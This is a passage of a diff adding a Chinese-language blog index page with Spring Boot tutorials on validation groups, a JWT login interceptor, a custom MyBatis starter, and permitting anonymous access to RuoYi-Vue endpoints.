+    public AjaxResult handleConstraintViolationException(ConstraintViolationException ex) &#123;
+        Set&lt;ConstraintViolation&lt;?&gt;&gt; constraintViolations = ex.getConstraintViolations();
+        List&lt;ConstraintViolation&lt;?&gt;&gt; list = constraintViolations.stream().toList();
+        System.out.println(list);
+        return AjaxResult.fail(AjaxHttpStatus.REQUEST_PARAM_ERROR);
+    &#125;
+
+    @ExceptionHandler(MethodArgumentNotValidException.class)
+    @ResponseStatus(HttpStatus.BAD_REQUEST)
+    public AjaxResult handleMethodArgumentNotValidException(MethodArgumentNotValidException ex) &#123;
+        return AjaxResult.fail(AjaxHttpStatus.REQUEST_PARAM_ERROR);
+    &#125;
+</code></pre>
+<p>那这种场景下，我们难道要将实体类新建两次，每一种场景都用一个吗？答案肯定是不行，毕竟哪个开发有这么多精力一直去新建实体类。那有什么好的办法吗？答案是有的：分组校验</p>
+<h2 id="2-分组校验的使用"><a href="#2-分组校验的使用" class="headerlink" title="2.分组校验的使用"></a>2.分组校验的使用</h2><h3 id="2-1-实体类中分别定义关于修改和添加到接口："><a href="#2-1-实体类中分别定义关于修改和添加到接口：" class="headerlink" title="2.1 实体类中分别定义关于修改和添加到接口："></a>2.1 实体类中分别定义关于修改和添加到接口：</h3><pre><code class="java">public class Category implements Serializable &#123;
+
+    public interface Insert &#123;&#125;
+    public interface Update &#123;&#125;
+    
+    //xxx其他代码
+&#125;
+</code></pre>
+<h3 id="2-2-在校验的注解上加上groups属性"><a href="#2-2-在校验的注解上加上groups属性" class="headerlink" title="2.2 在校验的注解上加上groups属性"></a>2.2 在校验的注解上加上groups属性</h3><pre><code class="java"> /**
+    * ID
+    */
+@NotNull(message=&quot;[ID]不能为空&quot;, groups = &#123;Update.class&#125;)
+@ApiModelProperty(&quot;ID&quot;)
+private Integer id;
+/**
+* 分类名称
+*/
+@NotBlank(message=&quot;[分类名称]不能为空&quot;,groups = &#123;Insert.class, Update.class&#125;)
+@Size(max= 32,message=&quot;编码长度不能超过32&quot;)
+@ApiModelProperty(&quot;分类名称&quot;)
+@Length(max= 32,message=&quot;编码长度不能超过32&quot;)
+private String categoryName;
+/**
+* 分类别名
+*/
+@NotBlank(message=&quot;[分类别名]不能为空&quot;,groups = &#123;Insert.class, Update.class&#125;)
+@Size(max= 32,message=&quot;编码长度不能超过32&quot;)
+@ApiModelProperty(&quot;分类别名&quot;)
+@Length(max= 32,message=&quot;编码长度不能超过32&quot;)
+private String categoryAlias;
+</code></pre>
+<h3 id="2-3-Controller方法上在-Validated指定校验的分组接口"><a href="#2-3-Controller方法上在-Validated指定校验的分组接口" class="headerlink" title="2.3 Controller方法上在@Validated指定校验的分组接口"></a>2.3 Controller方法上在@Validated指定校验的分组接口</h3><pre><code class="java"> /**
+ * 添加分类
+ * @param category
+ * @return
+ */
+@Operation(summary = &quot;添加分类&quot;)
+@PostMapping()
+public AjaxResult insert(@RequestBody @Validated(Category.Insert.class) Category category) &#123;
+    categoryService.insert(category);
+    return AjaxResult.success(AjaxHttpStatus.SUCCESS);
+&#125;
+
+/**
+ * 修改分类
+ * @param category
+ * @return
+ */
+@Operation(summary = &quot;修改分类&quot;)
+@PutMapping
+public AjaxResult update(@RequestBody @Validated(Category.Update.class) Category category) &#123;
+    categoryService.update(category);
+    return AjaxResult.success(AjaxHttpStatus.SUCCESS);
+&#125;
+</code></pre>
+<p><strong>来，测试一把：</strong></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240805133113950.png" alt="image-20240805133113950"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240805133144739.png" alt="image-20240805133144739"></p>
+<p><strong>数据库中的结果：</strong><br><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240805133218945.png" alt="image-20240805133218945"></p>
+<h2 id="3-项目地址"><a href="#3-项目地址" class="headerlink" title="3.项目地址"></a>3.项目地址</h2><h3 id="3-1-github"><a href="#3-1-github" class="headerlink" title="3.1 github"></a>3.1 github</h3><p><a target="_blank" rel="noopener" href="https://github.com/xccit/big-event">xccit&#x2F;big-event: 大事件(黑马程序员项目改造) (github.com)</a></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/SpringBoot/" style="color: #03a9f4">SpringBoot</a>
+        </span>
+        
+    </div>
+    <a href="/2024/08/05/SpringBoot-validation%E5%A6%82%E4%BD%95%E5%88%86%E7%BB%84%E6%A0%A1%E9%AA%8C/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/08/03/JWT-SpringBoot%E5%81%9A%E7%99%BB%E5%BD%95%E6%8B%A6%E6%88%AA/">
+        <h2 class="post-title">JWT+SpringBoot做登录拦截</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/3
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="SpringBoot-JWT做登录拦截"><a href="#SpringBoot-JWT做登录拦截" class="headerlink" title="SpringBoot+JWT做登录拦截"></a>SpringBoot+JWT做登录拦截</h1><h2 id="1-为什么要做登录拦截"><a href="#1-为什么要做登录拦截" class="headerlink" title="1.为什么要做登录拦截?"></a>1.为什么要做登录拦截?</h2><p>项目为了防止接口被滥用,一般都会在除登录以及一些静态资源的访问之外将其他接口保护起来,为了安全访问必须登录之后才行。</p>
+<h2 id="2-项目准备工作"><a href="#2-项目准备工作" class="headerlink" title="2.项目准备工作"></a>2.项目准备工作</h2><h3 id="2-1-实体类"><a href="#2-1-实体类" class="headerlink" title="2.1 实体类"></a>2.1 实体类</h3><h3 id="2-2-Controller-Service-Mapper三件套"><a href="#2-2-Controller-Service-Mapper三件套" class="headerlink" title="2.2 Controller,Service,Mapper三件套"></a>2.2 Controller,Service,Mapper三件套</h3><h3 id="2-3-返回的状态信息"><a href="#2-3-返回的状态信息" class="headerlink" title="2.3 返回的状态信息"></a>2.3 返回的状态信息</h3><blockquote>
+<p>AjaxResult,AjaxHttpStatus</p>
+</blockquote>
+<h2 id="3-拦截器定义"><a href="#3-拦截器定义" class="headerlink" title="3.拦截器定义"></a>3.拦截器定义</h2><pre><code class="java">package io.xccit.event.interceptor;
+
+import com.fasterxml.jackson.databind.ObjectMapper;
+import io.xccit.event.resut.AjaxHttpStatus;
+import io.xccit.event.resut.AjaxResult;
+import io.xccit.event.utils.JwtUtil;
+import io.xccit.event.utils.ThreadLocalUserUtil;
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
+import org.springframework.stereotype.Component;
+import org.springframework.web.servlet.HandlerInterceptor;
+
+import java.util.Map;
+
+/**
+ * @author CH_ywx
+ * @version 1.0
+ * @create 2024/8/3
+ * &lt;p&gt;登录拦截器&lt;/p&gt;
+ */
+@Component
+public class LoginInterceptor implements HandlerInterceptor &#123;
+
+    private final ObjectMapper objectMapper = new ObjectMapper();
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;
+        String authorization = request.getHeader(&quot;Authorization&quot;);
+        try &#123;
+            Map&lt;String, Object&gt; claims = JwtUtil.verify(authorization);
+            ThreadLocalUserUtil.set(claims);
+            return true;
+        &#125; catch (Exception e) &#123;
+            response.setContentType(&quot;application/json&quot;);
+            response.setCharacterEncoding(&quot;UTF-8&quot;);
+            response.setStatus(AjaxHttpStatus.UNAUTHORIZED.getCode());
+            return false;
+        &#125;
+    &#125;
+
+    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123;
+        ThreadLocalUserUtil.remove();
+    &#125;
+&#125;
+</code></pre>
+<blockquote>
+<p>以上代码中，由于项目没有使用SpringSecurity权限管理框架，所以在没有权限的状态下，默认只能拦截请求，也就是在preHandle函数返回false，那这种情况下对于用户来说,体验就很差。优化建议:</p>
+<p>1.导入Jackson库:使用Jackson库将AjaxResult对象转换为JSON字符串。<br>2.创建ObjectMapper实例:在类级别创建一个ObjectMapper实例，用于序列化AjaxResult对象。<br>3.构造AjaxResult:当JWT验证失败时，创建一个AjaxResult实例，设置状态码为401（未授权），并将其作为响应体的内容。<br>4.序列化和写入响应:使用ObjectMapper将AjaxResult对象序列化为JSON字符串。<br>5.使用response.getWriter()获取响应输出流，并将JSON字符串写入其中。这样，当JWT验证失败时，前端将收到一个符合AjaxResult格式的错误响应。</p>
+</blockquote>
+<p><strong>优化后的拦截器:</strong></p>
+<pre><code class="java">package io.xccit.event.interceptor;
+
+import com.fasterxml.jackson.databind.ObjectMapper;
+import io.xccit.event.resut.AjaxHttpStatus;
+import io.xccit.event.resut.AjaxResult;
+import io.xccit.event.utils.JwtUtil;
+import io.xccit.event.utils.ThreadLocalUserUtil;
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
+import org.springframework.stereotype.Component;
+import org.springframework.web.servlet.HandlerInterceptor;
+
+import java.util.Map;
+
+/**
+ * @author CH_ywx
+ * @version 1.0
+ * @create 2024/8/3
+ * &lt;p&gt;登录拦截器&lt;/p&gt;
+ */
+@Component
+public class LoginInterceptor implements HandlerInterceptor &#123;
+
+    private final ObjectMapper objectMapper = new ObjectMapper();
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;
+        String authorization = request.getHeader(&quot;Authorization&quot;);
+        try &#123;
+            Map&lt;String, Object&gt; claims = JwtUtil.verify(authorization);
+            ThreadLocalUserUtil.set(claims);
+            return true;
+        &#125; catch (Exception e) &#123;
+            response.setContentType(&quot;application/json&quot;);
+            response.setCharacterEncoding(&quot;UTF-8&quot;);
+            response.setStatus(AjaxHttpStatus.UNAUTHORIZED.getCode());
+            AjaxResult&lt;Void&gt; result = AjaxResult.fail(AjaxHttpStatus.UNAUTHORIZED);
+            response.getWriter().write(objectMapper.writeValueAsString(result));
+            return false;
+        &#125;
+    &#125;
+
+    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123;
+        ThreadLocalUserUtil.remove();
+    &#125;
+&#125;
+</code></pre>
+<p>这样,当我们<code>未登录</code>时,返回的信息如下:</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240803232806469.png" alt="image-20240803232806469"></p>
+<p><code>登录后:</code></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240803232855964.png" alt="image-20240803232855964"></p>
+<p>完整代码,请访问我的github主页: <a target="_blank" rel="noopener" href="https://github.com/xccit">xccit (github.com)</a></p>
+<p>项目地址:<a target="_blank" rel="noopener" href="https://github.com/xccit/big-event">xccit&#x2F;big-event (github.com)</a></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/SpringBoot/" style="color: #ff7d73">SpringBoot</a>
+        </span>
+        
+    </div>
+    <a href="/2024/08/03/JWT-SpringBoot%E5%81%9A%E7%99%BB%E5%BD%95%E6%8B%A6%E6%88%AA/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/08/01/SpringBoot%E8%87%AA%E5%AE%9A%E4%B9%89Starter/">
+        <h2 class="post-title">SpringBoot自定义Starter</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/1
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="SpringBoot自定义Starter"><a href="#SpringBoot自定义Starter" class="headerlink" title="SpringBoot自定义Starter"></a>SpringBoot自定义Starter</h1><h2 id="1-何为Starter"><a href="#1-何为Starter" class="headerlink" title="1.何为Starter?"></a>1.何为Starter?</h2><p><code>Starter</code>顾名思义,就是SpringBoot工程的起步依赖,例如SpringBoot工程自身的<code>spring-boot-starter</code>,整合MyBatis时用的<code>mybatis-spring-boot-starter</code>,有了起步依赖,SpringBoot工程在引入该坐标后就可以完成自动注入等工作,大大提高了开发效率。</p>
+<h2 id="2-如何自定义？"><a href="#2-如何自定义？" class="headerlink" title="2.如何自定义？"></a>2.如何自定义？</h2><p>首先,起步依赖必须遵守SpringBoot工程的规范,先看一下官网文档:</p>
+<p><a target="_blank" rel="noopener" href="https://docs.spring.io/spring-boot/reference/features/developing-auto-configuration.html#features.developing-auto-configuration.custom-starter.starter-module">Creating Your Own Auto-configuration :: Spring Boot</a></p>
+<p>我们以mybatis的起步依赖为例,至少需要准备两个工程:</p>
+<ul>
+<li>custom-mybatis-boot-starter</li>
+<li>custom-mybatis-boot-autoconfigure</li>
+</ul>
+<p>其中starter只是一个空工程,只需要一个<code>pom.xml</code>,用来整合<code>autoconfigure</code>完成自动配置,而<code>autoconfigure</code>则依赖于<code>mybatis</code>及<code>mybatis-spring</code>等依赖,因为mybatis已经针对spring做了整合包,许多配置已经写好,不需要我们再写,只需要按照SpringBoot的规则做好starter方便与SpringBoot进行整合即可。</p>
+<h2 id="3-自定义MyBatis起步依赖"><a href="#3-自定义MyBatis起步依赖" class="headerlink" title="3.自定义MyBatis起步依赖"></a>3.自定义MyBatis起步依赖</h2><h3 id="1-创建两个工程"><a href="#1-创建两个工程" class="headerlink" title="1.创建两个工程"></a>1.创建两个工程</h3><p><code>custom-mybatis-boot-starter</code>与<code>custom-mybatis-boot-autoconfigure</code></p>
+<h3 id="2-autoconfigure工程"><a href="#2-autoconfigure工程" class="headerlink" title="2.autoconfigure工程"></a>2.autoconfigure工程</h3><h4 id="2-1加入需要的依赖"><a href="#2-1加入需要的依赖" class="headerlink" title="2.1加入需要的依赖"></a>2.1加入需要的依赖</h4><pre><code class="xml">&lt;dependency&gt;
+      &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
+      &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt;
+      &lt;version&gt;3.0.3&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+  &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
+  &lt;artifactId&gt;mybatis&lt;/artifactId&gt;
+  &lt;version&gt;3.5.14&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+  &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;
+  &lt;version&gt;3.3.2&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+  &lt;artifactId&gt;spring-boot-starter-data-jdbc&lt;/artifactId&gt;
+  &lt;version&gt;3.0.5&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h4 id="2-2编写自动配置类"><a href="#2-2编写自动配置类" class="headerlink" title="2.2编写自动配置类"></a>2.2编写自动配置类</h4><pre><code class="java">package io.xccit.config;
+
+import org.apache.ibatis.annotations.Mapper;
+import org.mybatis.spring.SqlSessionFactoryBean;
+import org.mybatis.spring.mapper.MapperScannerConfigurer;
+import org.springframework.beans.factory.BeanFactory;
+import org.springframework.boot.autoconfigure.AutoConfiguration;
+import org.springframework.boot.autoconfigure.AutoConfigurationPackages;
+import org.springframework.boot.autoconfigure.condition.ConditionalOnBean;
+import org.springframework.context.annotation.Bean;
+
+import javax.sql.DataSource;
+import java.util.List;
+
+/**
+ * @author CH_ywx
+ * @version 1.0
+ * @create 2024/8/1
+ * &lt;p&gt;Mybatis自动配置类&lt;/p&gt;
+ */
+@AutoConfiguration
+public class CustomMybatisAutoConfigure &#123;
+
+    /**
+     * 当容器中存在DataSource时，自动配置SqlSessionFactoryBean
+     * @param dataSource
+     * @return
+     */
+    @Bean
+    public SqlSessionFactoryBean sqlSessionFactoryBean(DataSource dataSource)&#123;
+        SqlSessionFactoryBean factoryBean = new SqlSessionFactoryBean();
+        factoryBean.setDataSource(dataSource);
+        return factoryBean;
+    &#125;
+
+    /**
+     * 当容器中存在SqlSessionFactoryBean时，自动配置MapperScannerConfigurer
+     * @param beanFactory
+     * @return
+     */
+    @ConditionalOnBean(SqlSessionFactoryBean.class)
+    @Bean
+    public MapperScannerConfigurer mapperScannerConfigurer(BeanFactory beanFactory)&#123;
+        MapperScannerConfigurer configurer = new MapperScannerConfigurer();
+        List&lt;String&gt; packages = AutoConfigurationPackages.get(beanFactory);
+        configurer.setBasePackage(packages.get(0));
+        configurer.setAnnotationClass(Mapper.class);
+        return configurer;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="2-3定义自动配置的注册文件"><a href="#2-3定义自动配置的注册文件" class="headerlink" title="2.3定义自动配置的注册文件"></a>2.3定义自动配置的注册文件</h4><pre><code class="yaml">io.xccit.config.CustomMybatisAutoConfigure
+</code></pre>
+<p>文件定义时需要注意:</p>
+<ul>
+<li><p>SpringBoot2.7及以上,文件名为: <a href="........%5CIdeaProjects%5Cboot-study-code%5Ccustom-mybatis-boot-autoconfigure%5Csrc%5Cmain%5Cresources%5CMETA-INF%5Cspring%5Corg.springframework.boot.autoconfigure.AutoConfiguration.imports">org.springframework.boot.autoconfigure.AutoConfiguration.imports</a> </p>
+</li>
+<li><p>SpringBoot2.7以下,文件名为: <code>spring.factories</code></p>
+</li>
+<li><p>文件所在的位置为:resources&#x2F;META-INF&#x2F;spring&#x2F;</p>
+</li>
+</ul>
+<p>以上条件缺一不可,不然SpringBoot无法完成自动配置,配置类中的Bean则无法注入,如果不熟悉该流程,可以参考SpringBoot官方文档: <a target="_blank" rel="noopener" href="https://docs.spring.io/spring-boot/reference/features/developing-auto-configuration.html#features.developing-auto-configuration.locating-auto-configuration-candidates">Creating Your Own Auto-configuration :: Spring Boot</a></p>
+<p>我们来看一下该工程的结构:</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240801221146687.png" alt="image-20240801221146687"></p>
+<h3 id="3-starter工程"><a href="#3-starter工程" class="headerlink" title="3.starter工程"></a>3.starter工程</h3><p>starter工程只需要在<code>pom.xml</code>中引入<code>autoconfigure</code>及依赖的包,Spring官方也推荐我们这么做</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240801221315675.png" alt="image-20240801221315675"></p>
+<pre><code class="xml">&lt;dependencies&gt;
+    &lt;!--自定义mybatis自动配置--&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;io.xccit&lt;/groupId&gt;
+      &lt;artifactId&gt;custom-mybatis-boot-autoconfigure&lt;/artifactId&gt;
+      &lt;version&gt;1.0&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
+      &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt;
+      &lt;version&gt;3.0.3&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
+      &lt;artifactId&gt;mybatis&lt;/artifactId&gt;
+      &lt;version&gt;3.5.14&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+      &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;
+      &lt;version&gt;3.3.2&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+      &lt;artifactId&gt;spring-boot-starter-data-jdbc&lt;/artifactId&gt;
+      &lt;version&gt;3.0.5&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;junit&lt;/groupId&gt;
+      &lt;artifactId&gt;junit&lt;/artifactId&gt;
+      &lt;version&gt;3.8.1&lt;/version&gt;
+      &lt;scope&gt;test&lt;/scope&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;
+</code></pre>
+<h2 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h2><h3 id="4-1新建一个SpringBoot工程"><a href="#4-1新建一个SpringBoot工程" class="headerlink" title="4.1新建一个SpringBoot工程"></a>4.1新建一个SpringBoot工程</h3><pre><code class="xml">&lt;dependencies&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
+    &lt;/dependency&gt;
+    &lt;!--引入自定义starter--&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;io.xccit&lt;/groupId&gt;
+        &lt;artifactId&gt;custom-mybatis-boot-starter&lt;/artifactId&gt;
+        &lt;version&gt;1.0&lt;/version&gt;
+    &lt;/dependency&gt;
+
+    &lt;dependency&gt;
+        &lt;groupId&gt;com.mysql&lt;/groupId&gt;
+        &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt;
+        &lt;scope&gt;runtime&lt;/scope&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
+        &lt;scope&gt;test&lt;/scope&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;
+        &lt;artifactId&gt;mybatis-spring-boot-starter-test&lt;/artifactId&gt;
+        &lt;version&gt;3.0.3&lt;/version&gt;
+        &lt;scope&gt;test&lt;/scope&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
+        &lt;artifactId&gt;lombok&lt;/artifactId&gt;
+        &lt;version&gt;1.18.30&lt;/version&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;
+</code></pre>
+<h3 id="4-2-配置数据源"><a href="#4-2-配置数据源" class="headerlink" title="4.2 配置数据源"></a>4.2 配置数据源</h3><pre><code class="yaml">spring:
+  application:
+    name: test
+  datasource:
+    driver-class-name: com.mysql.cj.jdbc.Driver
+    url: jdbc:mysql://localhost:3306/springboot3_study?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;allowPublicKeyRetrieval=true
+    username: root
+    password: 1209
+</code></pre>
+<h3 id="4-3编写组件"><a href="#4-3编写组件" class="headerlink" title="4.3编写组件"></a>4.3编写组件</h3><pre><code class="java">package io.xccit.controller;
+
+import io.xccit.entity.User;
+import io.xccit.service.IUserService;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PathVariable;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RestController;
+
+/**
+ * @author CH_ywx
+ * @version 1.0
+ * @create 2024/7/27
+ * &lt;p&gt;UserController&lt;/p&gt;
+ */
+@RestController
+@RequestMapping(&quot;/user&quot;)
+public class UserController &#123;
+
+    @Autowired
+    private IUserService userService;
+
+    @GetMapping(&quot;/&#123;id&#125;&quot;)
+    public User selectUserByID(@PathVariable Integer id) &#123;
+        return userService.selectUserByID(id);
+    &#125;
+&#125;
+</code></pre>
+<pre><code class="java">package io.xccit.entity;
+
+import lombok.AllArgsConstructor;
+import lombok.Data;
+import lombok.NoArgsConstructor;
+
+/**
+ * @author CH_ywx
+ * @version 1.0
+ * @create 2024/7/27
+ * &lt;p&gt;用户&lt;/p&gt;
+ */
+@Data
+@NoArgsConstructor
+@AllArgsConstructor
+public class User &#123;
+    private Integer id;
+    private String name;
+    private Integer age;
+    private Integer gender;
+    private String phone;
+&#125;
+</code></pre>
+<pre><code class="java">package io.xccit.mapper;
+
+import io.xccit.entity.User;
+import org.apache.ibatis.annotations.Mapper;
+import org.apache.ibatis.annotations.Select;
+
+/**
+ * @author CH_ywx
+ * @version 1.0
+ * @create 2024/7/27
+ * &lt;p&gt;UserMapper&lt;/p&gt;
+ */
+@Mapper
+public interface IUserMapper &#123;
+
+    @Select(&quot;SELECT id,name,age,gender,phone FROM user WHERE id = #&#123;id&#125;&quot;)
+    public User selectUserByID(Integer id);
+&#125;
+</code></pre>
+<pre><code class="java">package io.xccit.service;
+
+import io.xccit.entity.User;
+
+/**
+ * @author CH_ywx
+ * @version 1.0
+ * @create 2024/7/27
+ * &lt;p&gt;UserService&lt;/p&gt;
+ */
+public interface IUserService &#123;
+
+    public User selectUserByID(Integer id);
+&#125;
+</code></pre>
+<pre><code class="java">package io.xccit.service.impl;
+
+import io.xccit.entity.User;
+import io.xccit.mapper.IUserMapper;
+import io.xccit.service.IUserService;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.stereotype.Service;
+
+/**
+ * @author CH_ywx
+ * @version 1.0
+ * @create 2024/7/27
+ * &lt;p&gt;UserService实现&lt;/p&gt;
+ */
+@Service
+public class UserServiceImpl implements IUserService &#123;
+
+    @Autowired
+    private IUserMapper userMapper;
+
+    @Override
+    public User selectUserByID(Integer id) &#123;
+        return userMapper.selectUserByID(id);
+    &#125;
+&#125;
+</code></pre>
+<h3 id="4-4启动测试"><a href="#4-4启动测试" class="headerlink" title="4.4启动测试"></a>4.4启动测试</h3><p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20240801221844965.png" alt="image-20240801221844965"></p>
+<blockquote>
+<p>至此,大功告成,Java实习生,希望各位大佬指正批评</p>
+</blockquote>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/SpringBoot/" style="color: #00a596">SpringBoot</a>
+        </span>
+        
+    </div>
+    <a href="/2024/08/01/SpringBoot%E8%87%AA%E5%AE%9A%E4%B9%89Starter/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/07/21/ruoyi-vue%E5%A6%82%E4%BD%95%E4%B8%8D%E9%AA%8C%E8%AF%81Token%E8%AE%BF%E9%97%AE%E6%8E%A5%E5%8F%A3/">
+        <h2 class="post-title">ruoyi-vue如何不验证Token访问接口</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/21
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="Ruoyi-vue如何不验证Token访问接口"><a href="#Ruoyi-vue如何不验证Token访问接口" class="headerlink" title="Ruoyi-vue如何不验证Token访问接口"></a>Ruoyi-vue如何不验证Token访问接口</h1><blockquote>
+<p>若依前后端分离项目中,默认使用代码生成的接口是需要验证Token才能调用的,自己编写的接口如果没有经过配置,也需要验证Token,如果需要跳过Token验证直接访问,我们该怎么做呢?</p>
+</blockquote>
+<h2 id="1-配置匿名访问"><a href="#1-配置匿名访问" class="headerlink" title="1.配置匿名访问"></a>1.配置匿名访问</h2><p>在<code>ruoyi-framework</code>模块下<code>SecurityConfig</code>类中的<code>configure</code>方法中添加匿名访问配置:</p>
+<pre><code class="java">.antMatchers(&quot;/路径/**&quot;).permitAll()
+</code></pre>
+<p>例如:</p>
+<pre><code class="java">.antMatchers(&quot;/user/**&quot;).permitAll()
+</code></pre>
+<h2 id="2-添加-Anonymous-注解"><a href="#2-添加-Anonymous-注解" class="headerlink" title="2.添加*@Anonymous*注解"></a>2.添加*@Anonymous*注解</h2><pre><code class="java">/*类上定义匿名注解，作用于所有的方法*/
+@Anonymous
+@RestController
+@RequestMapping(&quot;/user&quot;)
+public class UserController extends BaseController
+&#123;
+
+&#125;
+</code></pre>
+<pre><code class="java">/*方法定义匿名注解，作用于单独的方法*/
+@Anonymous
+@GetMapping(&quot;/list&quot;)
+public List&lt;User&gt; list(User user)
+&#123;
+    List&lt;User&gt; userList = userService.selectList(user);
+    return AjaxResult.success(userList);
+&#125;
+</code></pre>
+<blockquote>
+<p>匿名访问的方法上面<code>@PreAuthorize</code>权限注解也需要去掉，因为已经使用匿名访问了，权限自然也不需要去验证了。</p>
+</blockquote>
+<p>最后重启项目即可跳过Token访问接口</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E8%8B%A5%E4%BE%9D%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/" style="color: #00bcd4">若依二次开发</a>
+        </span>
+        
+    </div>
+    <a href="/2024/07/21/ruoyi-vue%E5%A6%82%E4%BD%95%E4%B8%8D%E9%AA%8C%E8%AF%81Token%E8%AE%BF%E9%97%AE%E6%8E%A5%E5%8F%A3/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/07/13/Docker%E7%AC%94%E8%AE%B0/">
+        <h2 class="post-title">Docker基础笔记</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/13
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
